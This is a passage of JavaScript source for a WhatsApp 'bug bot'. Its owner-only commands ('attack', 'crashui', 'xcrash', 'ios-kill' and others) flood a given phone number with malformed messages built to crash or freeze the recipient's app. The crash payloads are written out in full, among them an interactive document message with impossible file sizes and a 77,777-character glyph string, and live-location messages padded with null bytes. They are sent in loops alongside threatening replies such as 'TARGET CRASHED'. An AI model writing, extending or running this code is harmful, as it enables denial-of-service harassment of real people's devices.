reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox2(from, jumlah)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
//no function bot
break
case 'attack':{

    if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
 if (!text) return m.reply(`*Format salah!*\nExample: ${prefix + command} <nomor target>`);

 const targetJid = text.includes('@s.whatsapp.net') ? text : `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const thumbnail = fs.readFileSync('./Gallery/scar1.jpg'); 
 
 async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
 let etc = generateWAMessageFromContent(
 X,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 header: {
 title: "",
 documentMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
 mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
 fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
 fileLength: "9999999999999",
 pageCount: 9007199254740991,
 mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
 fileName: "⿻ CrazyCrash ⿻",
 fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
 directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1723855952",
 contactVcard: true,
 thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
 thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
 thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
 jpegThumbnail: ThM,
 },
 hasMediaAttachment: true,
 },
 body: {
 text: "⭑̤▾ ⿻ CrazyUi ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
 },
 nativeFlowMessage: {
 messageParamsJson: '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
 },
 },
 },
 },
 }),
 {
 userJid: X,
 quoted: Qtd,
 }
 );

 await bad.relayMessage(
 X,
 etc.message,
 ptcp
 ? {
 participant: {
 jid: X,
 },
 }
 : {}
 );
 console.log(chalk.green("𝗧𝗪 𝗖𝗜𝗟𝗟"));
 }

 // Function to send multiple messages
 async function sendMultipleMessages(targetJid, thumbnail, count = 5) {
 for (let i = 0; i < count; i++) {
 try {
 await ClPmNull(targetJid, m, thumbnail, false, true); // Send message
 console.log(`Pesan ke-${i + 1} berhasil dikirim!`);
 } catch (error) {
 console.log(`❌ Gagal mengirim pesan ke-${i + 1}: ${error.message}`);
 }
 }
 }

 // Call the function to send multiple messages (default 5 messages)
 try {
 await sendMultipleMessages(targetJid, thumbnail, 5); // Adjust count as needed
 m.reply(`Sukses Send Bug Ke : ${text}`);
 } catch (error) {
 m.reply(`❌ *Gagal mengirim pesan:* ${error.message}`);
 }
 }
 break
case 'crashui':{
    if (!isOwner) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
 if (!text) return m.reply(`*Format salah!*\nExample: ${prefix + command} 234xxxxxxxxxx 1`);

 const args = text.split(' ');
 const targetJid = args[0].includes("@s.whatsapp.net") ? args[0] : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;
 const count = parseInt(args[1]) || 5; // Default 5 pesan jika jumlah tidak disebutkan

 async function sendViewOnceMessage(receiverJid) {
 try {
 const generatedMessage = generateWAMessageFromContent(
 receiverJid,
 proto.Message.fromObject({
 viewOnceMessage: {
 message: {
 liveLocationMessage: {
 degreesLatitude: Math.random() * 180 - 90, // Random latitude
 degreesLongitude: Math.random() * 360 - 180, // Random longitude
 caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ‌‌ 𝙏𝙍𝘼𝙎𝙃" + "\0".repeat(100), // Pesan error
 sequenceNumber: `${Math.floor(Math.random() * 1000)}`, // Random urutan
 jpegThumbnail: Buffer.from([]), // Thumbnail kosong
 }
 }
 }
 }),
 {
 userJid: receiverJid,
 }
 );

 await bad.relayMessage(receiverJid, generatedMessage.message, {
 messageId: generatedMessage.key.id,
 });
 } catch (error) {
 console.error("❌ Gagal mengirim Bug:", error);
 }
 }

 async function sendMultipleMessages(receiverJid, count) {
 try {
 await Promise.all(
 Array.from({ length: count }).map(() => sendViewOnceMessage(receiverJid))
 );
 m.reply(`Sukses Send Bug ${args[0]}`);
 } catch (error) {
 m.reply(`❌ There is an error saat mengirim pesan: ${error.message}`);
 }
 }

 sendMultipleMessages(targetJid, count);
}
break
case 'hard-core': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'invasi-core': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'garri': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 35; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'easy-crash': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case '🔥': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 100; i++) {
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
await Bug1(target, Null)
await Bug2(target, Null)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'xcrash': {

if (!isOwner) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await InfiNite(m.chat, cct = true, ppt = true)
await InfiNite(m.chat, cct = true, ppt = true)
await freezeui(m.chat, ptcp = true)
await freezeuii(m.chat, ptcp = true)
await Bug1(m.chat, Null)
await Bug2(m.chat, Null)
await Bug1(m.chat, Null)
await Bug2(m.chat, Null)
await Sinvi(target, Ptcp = true)
await InfiNite(target, cct = true, ptcp = true)
await systemUi(target, Ptcp = true)
await Jade(target, ptcp = true)
await bak2(target)
}
reply("TARGET CRASHED")
}
break
case 'attack-andro': {

if (!isOwner) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await InfiNite(m.chat, cct = true, ppt = true)
await Bug2(m.chat, Null)
await Jade(target, ptcp = true)
await bak2(target)
await freezeui(m.chat, ptcp = true)
}
reply("TARGET CRASHED")
}
break
break
case 'ios-kill': case "ios-dead": case "war-ios": {

if (!isOwner) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await Scarlet(target)
                    await Scarlet(target)
                    await XiosPay(target)
                    await XiosVirus(target)
                    await TxIos(target, Ptcp = true)
}
reply("TARGET CRASHED")
}
break                    
                    
case 'x-andro': {

if (!isOwner) return reply("NO ACCESS")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
